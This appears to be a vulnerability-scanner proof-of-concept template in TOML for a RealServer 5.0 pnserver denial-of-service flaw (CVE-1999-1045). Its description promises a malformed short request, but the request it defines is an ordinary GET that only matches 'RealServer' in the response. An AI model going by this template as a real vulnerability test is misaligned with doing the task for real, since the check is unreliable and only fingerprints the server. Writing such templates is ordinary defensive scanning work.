[info]
author = "ave"
description = "向 RealServer pnserver 发送畸形短 HTTP 请求验证拒绝服务漏洞"
id = "POC-AVE-1999-1304"
name = "RealServer 5.0 pnserver 畸形短请求拒绝服务漏洞 PoC"
severity = "high"
tags = ["ave-1999-1304"]
vuln_id = [
    "CVE-1999-1045",
    "AVE-1999-1304",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["RealServer"]
